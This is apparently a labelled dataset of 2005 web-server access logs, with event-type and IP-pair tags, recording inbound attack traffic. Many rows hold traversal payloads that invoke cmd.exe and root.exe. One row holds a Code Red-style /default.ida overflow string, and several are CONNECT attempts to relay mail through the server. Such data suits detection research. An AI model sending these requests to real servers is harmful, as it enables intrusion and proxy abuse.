Date~,Time~,ClientIP$,HTTP_method,ClientRequestLine@,Http_protocol@,StatusCode,ObjectSize~,Referrer~,Agent@,label_event_type~,label_IPpair_ID~
"2005-02-01","23:35:23","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:23","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:23","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:23","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:31","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:31","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:31","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:31","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-02","00:37:10","219.134.43.80","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S239"
"2005-02-02","00:38:31","143.127.131.4","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S17"
"2005-02-02","12:12:58","66.117.40.185","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S464"
"2005-02-02","15:28:07","63.162.143.21","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S428"
"2005-02-02","17:17:30","69.86.164.233","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:32","69.86.164.233","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:34","69.86.164.233","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:36","69.86.164.233","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:38","69.86.164.233","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:39","69.86.164.233","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:41","69.86.164.233","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:43","69.86.164.233","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:45","69.86.164.233","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:47","69.86.164.233","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:48","69.86.164.233","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:50","69.86.164.233","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:52","69.86.164.233","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S553"
"2005-02-02","17:17:54","69.86.164.233","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S553"
"2005-02-02","17:17:56","69.86.164.233","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","17:17:57","69.86.164.233","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S553"
"2005-02-02","18:32:44","63.175.119.2","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S429"
"2005-02-02","19:19:37","66.42.59.82","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S483"
"2005-02-02","21:26:07","204.76.166.50","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S97"
"2005-02-02","21:37:00","218.11.1.50","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S183"
"2005-02-03","02:33:04","60.248.26.50","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:05","60.248.26.50","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:06","60.248.26.50","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:06","60.248.26.50","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:07","60.248.26.50","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:08","60.248.26.50","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:08","60.248.26.50","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:09","60.248.26.50","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:10","60.248.26.50","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:10","60.248.26.50","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:14","60.248.26.50","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:15","60.248.26.50","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:15","60.248.26.50","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S358"
"2005-02-03","02:33:16","60.248.26.50","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S358"
"2005-02-03","02:33:16","60.248.26.50","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","02:33:17","60.248.26.50","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S358"
"2005-02-03","03:27:04","222.84.42.191","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S317"
"2005-02-03","07:31:48","218.106.185.78","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S182"
"2005-02-03","08:25:35","81.6.250.202","GET","/NULL.printer","-","'404'",1061,"-","-","AA","S575"
"2005-02-03","18:00:51","61.10.7.91","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S382"
"2005-02-03","20:24:51","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:52","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:52","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:52","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:54","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:54","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:54","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:54","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:54","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:54","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:55","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:55","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:53","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:55","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:55","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","20:24:54","210.127.248.52","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S125"
"2005-02-03","21:52:24","61.10.7.168","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S369"
"2005-02-04","01:29:17","67.133.116.245","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S494"
"2005-02-04","04:27:47","222.166.160.220","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S301"
"2005-02-04","08:36:53","67.176.32.32","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","HTTP/1.0","'404'",1061,"-","-","AA","S504"
"2005-02-04","09:11:36","220.168.210.35","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S259"
"2005-02-04","09:44:25","12.33.114.7","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S3"
"2005-02-04","10:13:29","220.28.212.176","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:30","220.28.212.176","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:31","220.28.212.176","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:31","220.28.212.176","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:32","220.28.212.176","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:33","220.28.212.176","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:34","220.28.212.176","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:35","220.28.212.176","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:35","220.28.212.176","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:36","220.28.212.176","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:37","220.28.212.176","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:37","220.28.212.176","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:38","220.28.212.176","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S270"
"2005-02-04","10:13:38","220.28.212.176","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S270"
"2005-02-04","10:13:39","220.28.212.176","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","10:13:40","220.28.212.176","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S270"
"2005-02-04","12:16:03","143.127.131.4","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S17"
"2005-02-04","12:44:41","209.137.237.154","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S118"
"2005-02-04","13:43:24","61.180.25.164","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S398"
"2005-02-04","15:26:03","81.6.250.202","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","HTTP/1.0","'404'",1061,"-","-","AA","S575"
"2005-02-04","16:16:07","35.11.228.62","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S346"
"2005-02-04","19:17:47","216.10.108.138","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S163"
"2005-02-04","19:17:48","64.85.244.116","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S448"
"2005-02-04","19:53:30","61.186.47.103","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S401"
"2005-02-04","23:19:33","210.139.114.144","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S126"
"2005-02-05","02:03:18","61.30.127.4","GET","/sumthin","HTTP/1.0","'404'",1050,"-","-","AA","S412"
"2005-02-05","02:03:18","61.30.127.4","GET","/sumthin","HTTP/1.0","'404'",1050,"-","-","AA","S412"
"2005-02-05","02:03:21","61.30.127.4","GET","/sumthin","HTTP/1.0","'404'",1050,"-","-","AA","S412"
"2005-02-05","04:38:46","172.169.6.104","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:47","172.169.6.104","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:48","172.169.6.104","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:49","172.169.6.104","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:49","172.169.6.104","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:50","172.169.6.104","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:51","172.169.6.104","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:51","172.169.6.104","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:52","172.169.6.104","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:52","172.169.6.104","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:53","172.169.6.104","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:54","172.169.6.104","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:54","172.169.6.104","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S40"
"2005-02-05","04:38:55","172.169.6.104","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S40"
"2005-02-05","04:38:56","172.169.6.104","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:38:56","172.169.6.104","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S40"
"2005-02-05","04:58:42","61.164.228.76","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S393"
"2005-02-05","06:14:06","219.159.11.242","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S248"
"2005-02-05","06:24:21","69.132.61.203","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S535"
"2005-02-05","06:44:47","65.96.54.37","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","HTTP/1.0","'404'",1061,"-","-","AA","S462"
"2005-02-05","08:46:10","69.180.27.40","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S541"
"2005-02-05","09:08:05","69.17.223.1","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S540"
"2005-02-05","10:56:15","67.104.133.214","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S490"
"2005-02-05","10:58:26","211.144.162.173","CONNECT","mailin-04.mx.aol.com:25","HTTP/1.0","'405'",988,"-","-","AD","S139"
"2005-02-05","11:02:45","218.78.209.75","CONNECT","mx3.mail.yahoo.com:25","HTTP/1.0","'405'",986,"-","-","AD","S225"
"2005-02-05","11:04:29","218.78.209.79","CONNECT","mx3.mail.yahoo.com:25","HTTP/1.0","'405'",986,"-","-","AD","S227"
"2005-02-05","11:06:06","219.153.10.141","CONNECT","mail-fwd.mx.g19.rapidsite.net:25","HTTP/1.0","'405'",997,"-","-","AD","S246"
"2005-02-05","11:08:31","211.144.162.173","CONNECT","mail.hottieonwebcams34.biz:25","HTTP/1.0","'405'",994,"-","-","AD","S139"
"2005-02-05","11:12:58","219.153.10.142","CONNECT","mail.hottieonwebcams34.biz:25","HTTP/1.0","'405'",994,"-","-","AD","S247"
"2005-02-05","11:20:41","219.153.10.142","CONNECT","mx1.mail.yahoo.com:25","HTTP/1.0","'405'",986,"-","-","AD","S247"
"2005-02-05","11:21:30","218.78.209.75","CONNECT","mailin-04.mx.aol.com:25","HTTP/1.0","'405'",988,"-","-","AD","S225"
"2005-02-05","11:39:57","219.153.10.140","CONNECT","mail.hottieonwebcams34.biz:25","HTTP/1.0","'405'",994,"-","-","AD","S245"
"2005-02-05","12:29:10","218.78.209.77","CONNECT","mail-fwd.mx.g19.rapidsite.net:25","HTTP/1.0","'405'",997,"-","-","AD","S226"
"2005-02-05","12:31:39","61.10.7.238","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S375"
"2005-02-05","12:33:02","219.153.10.142","CONNECT","mx3.mail.yahoo.com:25","HTTP/1.0","'405'",986,"-","-","AD","S247"
"2005-02-05","12:38:48","218.78.209.67","CONNECT","mail-fwd.mx.g19.rapidsite.net:25","HTTP/1.0","'405'",997,"-","-","AD","S224"
"2005-02-05","12:48:30","218.78.209.77","CONNECT","mailin-03.mx.aol.com:25","HTTP/1.0","'405'",988,"-","-","AD","S226"
"2005-02-05","12:55:56","219.153.10.140","CONNECT","mailin-03.mx.aol.com:25","HTTP/1.0","'405'",988,"-","-","AD","S245"
"2005-02-05","13:03:59","211.144.162.173","-","","-","'501'",1002,"-","-","AC","S139"
"2005-02-05","15:09:39","211.144.162.173","POST","http://211.144.162.173:25/","HTTP/1.1","'404'",1053,"-","-","AC","S139"
"2005-02-05","15:57:28","216.184.121.184","GET","/NULL.printer","-","'404'",1061,"-","-","AA","S168"
"2005-02-05","16:01:46","219.153.10.142","POST","http://219.153.10.142:25/","HTTP/1.1","'404'",1052,"-","-","AC","S247"
"2005-02-05","16:44:25","211.144.162.173","POST","http://211.144.162.173:25/","HTTP/1.1","'404'",1053,"-","-","AC","S139"
"2005-02-05","17:04:22","24.59.93.128","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S340"
"2005-02-05","18:09:23","12.8.192.60","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S5"
"2005-02-05","22:46:02","65.187.197.175","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S459"
"2005-02-06","00:18:56","24.18.186.248","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:56","24.18.186.248","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:57","24.18.186.248","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:57","24.18.186.248","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:58","24.18.186.248","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:58","24.18.186.248","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:58","24.18.186.248","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:59","24.18.186.248","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:59","24.18.186.248","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:18:59","24.18.186.248","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:19:00","24.18.186.248","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:19:00","24.18.186.248","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S331"
"2005-02-06","00:19:00","24.18.186.248","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S331"
